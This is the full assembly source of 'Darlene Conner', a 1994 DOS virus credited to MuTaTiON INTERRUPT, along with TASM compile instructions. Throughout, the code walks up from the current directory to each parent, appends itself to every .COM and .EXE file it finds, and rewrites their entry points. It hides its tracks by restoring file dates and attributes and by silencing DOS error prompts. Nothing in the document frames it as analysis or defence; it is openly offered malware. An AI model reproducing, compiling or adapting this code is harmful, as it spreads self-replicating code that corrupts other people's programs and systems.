;  Darlene Conner written by MuTaTiON INTERRUPT
;  To compile this use TASM /M darlene.asm


code    segment public 'code'
        assume  cs:code
        org     100h                              ; All .COM files start here

ID = 'AB'                                         ; Id for infected files

start:
        db 0e9h,0,0                               ; Jump to the next command

virus:
        call    realcode                          ; Push current location on stack
realcode:
        nop
        nop
        pop     bp                                ; Get location off stack
        sub     bp,offset realcode                ; Adjust it for our pointer
        nop
        nop
        cmp     sp,id                             ; COM or EXE?
        je      restoreEXE

        lea     si,[bp+offset oldjump]            ; Location of old jump in si
        mov     di,100h                           ; Location of where to put it in di
        push    di                                ; Save so we could just return when done
        movsb                                     ; Move a byte
        movsw                                     ; Move a word
        jmp     exitrestore

restoreEXE:
        push    ds                                ; Save ExE ds
        push    es                                ; Save ExE es
        push    cs
        pop     ds                                ; DS now equals CS
        push    cs
        pop     es                                ; ES now equals CS
        lea     si,[bp+jmpsave2]
        lea     di,[bp+jmpsave]
        movsw                                     ; Move a word
        movsw                                     ; Move a word
        movsw                                     ; Move a word
        movsw                                     ; Move a word

ExitRestore:
        lea     dx,[bp+offset dta]                ; Where to put New DTA
        call    set_DTA                           ; Move it

        mov     ax,3524h                          ; Get int 24 handler
        int     21h                               ; To ES:BX
        mov     word ptr [bp+oldint24],bx         ; Save it
        mov     word ptr [bp+oldint24+2],es

        mov     ah,25h                            ; Set new int 24 handler
        lea     dx,[bp+offset int24]              ; DS:DX->new handler
        int     21h

        push    cs                                ; Restore ES
        pop     es                                ; 'cuz it was changed

        mov     ah,47h                            ; Get the current directory
        mov     dl,0h                             ; On current drive
        lea     si,[bp+offset currentdir]         ; Where to keep it
        int     21h

dirloop:
        lea     dx,[bp+offset exefilespec]
        call    findfirst
        lea     dx,[bp+offset comfilespec]
        call    findfirst

        lea     dx,[bp+offset directory]          ; Where to change too '..'
        mov     ah,3bh                            ; Change directory
        int     21h
        jnc     dirloop                           ; If no problems the look for files

        mov     ah,9                              ; Display string
        lea     dx,[bp+virusname]
        int     21h

        mov     ax,2524h                          ; Restore int 24 handler
        lds     dx,[bp+offset oldint24]           ; To original
        int     21h

        push    cs
        pop     ds                                ; Do this because the DS gets changed

        lea     dx,[bp+offset currentdir]         ; Location Of original dir
        mov     ah,3bh                            ; Change to there
        int     21h

        mov     dx,80h                            ; Location of original DTA
        call    set_dta                           ; Put it back there

        cmp     sp,id-4                           ; EXE or COM?
        jz      returnEXE

        retn                                      ; Return to 100h to original jump

ReturnEXE:
        pop     es                                ; Get original ES
        pop     ds                                ; Get original DS

        mov     ax,es
        add     ax,10h
        add     word ptr cs:[bp+jmpsave+2],ax
        add     ax,word ptr cs:[bp+stacksave+2]
        cli                                       ; Clear int's because of stack manipulation
        mov     sp,word ptr cs:[bp+stacksave]
        mov     ss,ax
        sti
        db      0eah                              ; Jump ssss:oooo
jmpsave dd      ?                                 ; Jump location
stacksave dd    ?                                 ; Original cs:ip
jmpsave2 dd     0fff00000h                        ; Used with carrier file
stacksave2 dd   ?

findfirst:
        mov     ah,4eh                            ; Find first file
        mov     cx,7                              ; Find all attributes

findnext:
        int     21h                               ; Find first/next file int
        jc      quit                              ; If none found then change dir

        call    infection                         ; Infect that file

Findnext2:
        mov     ah,4fh                            ; Find next file
        jmp     findnext                          ; Jump to the loop

quit:
        ret

infection:
        mov     ax,3d00h                          ; Open file for read only
        call    open

        mov     ah,3fh                            ; Read from file
        mov     cx,1ah
        lea     dx,[bp+offset buffer]             ; Location to store them
        int     21h

        mov     ah,3eh                            ; Close file
        int     21h

        cmp     word ptr [bp+buffer],'ZM'         ; EXE?
        jz      checkEXE                          ; Why yes, yes it is!
        mov     ax,word ptr [bp+DTA+35]           ; Get end of file name in ax
        cmp     ax,'DN'                           ; Does End in comma'ND'? (reverse order)
        jz      quitinfect                        ; Yup so get another file

CheckCom:
        mov     bx,[bp+offset dta+1ah]            ; Get file size
        mov     cx,word ptr [bp+buffer+1]         ; Get jump loc of file
        add     cx,eof-virus+3                    ; Add for virus size

        cmp     bx,cx                             ; Does file size=file jump+virus size
        jz      quitinfect                        ; Yup then get another file
        jmp     infectcom

CheckExe:
        cmp     word ptr [bp+buffer+10h],id       ; Check EXE for infection
        jz      quitinfect                        ; Already infected so close up
        jmp     infectexe

quitinfect:
        ret

InfectCom:
        sub     bx,3                              ; Adjust for new jump
        lea     si,[bp+buffer]
        lea     di,[bp+oldjump]
        movsw
        movsb
        mov     [bp+buffer],byte ptr 0e9h
        mov     word ptr [bp+buffer+1],bx         ; Save for later

        mov     cx,3                              ; Number of bytes to write

        jmp     finishinfection
InfectExe:
        les     ax,dword ptr [bp+buffer+14h]      ; Load es with seg address
        mov     word ptr [bp+jmpsave2],ax         ; save old cs:ip
        mov     word ptr [bp+jmpsave2+2],es

        les     ax,dword ptr [bp+buffer+0eh]      ; save old ss:sp
        mov     word ptr [bp+stacksave2],es       ; save old cs:ip
        mov     word ptr [bp+stacksave2+2],ax

        mov     ax, word ptr [bp+buffer+8]        ; get header size
        mov     cl,4
        shl     ax,cl
        xchg    ax,bx
        les     ax,[bp+offset DTA+26]             ; get files size from dta
        mov     dx,es                             ; its now in dx:ax
        push    ax                                ; save these
        push    dx

        sub     ax,bx                             ; subtract header size from fsize
        sbb     dx,0                              ; subtract the carry too
        mov     cx,10h                            ; convert to segment:offset form
        div     cx

        mov     word ptr [bp+buffer+14h],dx       ; put in new header
        mov     word ptr [bp+buffer+16h],ax       ; cs:ip

        mov     word ptr [bp+buffer+0eh],ax       ; ss:sp
        mov     word ptr [bp+buffer+10h],id       ; put id in for later
        pop     dx                                ; get the file length back
        pop     ax

        add     ax,eof-virus                      ; add virus size
        adc     dx,0                              ; add with carry

        mov     cl,9                              ; calculates new file size
        push    ax
        shr     ax,cl
        ror     dx,cl
        stc
        adc     dx,ax
        pop     ax
        and     ah,1

        mov     word ptr [bp+buffer+4],dx         ; save new file size in header
        mov     word ptr [bp+buffer+2],ax

        push    cs                                ; es = cs
        pop     es

        mov     cx,1ah                            ; Number of bytes to write (Header)
FinishInfection:
        push    cx                                ; save # of bytes to write
        xor     cx,cx                             ; Set attriutes to none
        call    attributes

        mov     al,2                              ; open file read/write
        call    open

        mov     ah,40h                            ; Write to file
        lea     dx,[bp+buffer]                    ; Location of bytes
        pop     cx                                ; Get number of bytes to write
        int     21h
        jc      closefile

        mov     al,02                             ; Move Fpointer to eof
        Call    move_fp

        mov     ah,40h                            ; Write virus to file
        mov     cx,eof-virus                      ; Size of virus
        lea     dx,[bp+offset virus]              ; Location to start from
        int     21h

closefile:
        mov     ax,5701h                          ; Set files date/time back
        mov     cx,word ptr [bp+dta+16h]          ; Get old time from dta
        mov     dx,word ptr [bp+dta+18h]          ; Get old date
        int     21h

        mov     ah,3eh                            ; Close file
        int     21h

        xor     cx,cx
        mov     cl,byte ptr [bp+dta+15h]          ; Get old Attributes
        call    attributes

        retn

move_fp:
        mov     ah,42h                            ; Move file pointer
        xor     cx,cx                             ; Al has location
        xor     dx,dx                             ; Clear these
        int     21h
        retn

set_dta:
        mov     ah,1ah                            ; Move the DTA location
        int     21h
        retn

open:
        mov     ah,3dh                            ; open file
        lea     dx,[bp+DTA+30]                    ; filename in DTA
        int     21h
        xchg    ax,bx                             ; file handle in bx
        ret

attributes:
        mov     ax,4301h                          ; Set attributes to cx
        lea     dx,[bp+DTA+30]                    ; filename in DTA
        int     21h
        ret
int24:                                            ; New int 24h (error) handler
        mov     al,3                              ; Fail call
        iret                                      ; Return from int 24 call

Virusname db 'Darlene Conner - Basketball Anyone?',10,13               ; Name Of The Virus
Author    db 'MuTaTiON INTERRUPT',10,13           ; Author Of This Virus
Made_with db '[NOVEMBER 1994]',10,13,'$'          ; Please do not remove this

comfilespec  db  '*.com',0                        ; Holds type of file to look for
exefilespec  db  '*.exe',0                        ; Holds type of file to look for
directory    db '..',0                            ; Directory to change to
oldjump      db  0cdh,020h,0h                     ; Old jump.  Is int 20h for file quit

eof     equ     $                                 ; Marks the end of file

currentdir db   64 dup (?)                        ; Holds the current dir
dta     db      42 dup (?)                        ; Location of new DTA
buffer db 1ah dup (?)                             ; Holds exe header
oldint24 dd ?                                     ; Storage for old int 24h handler

code    ends
        end     start

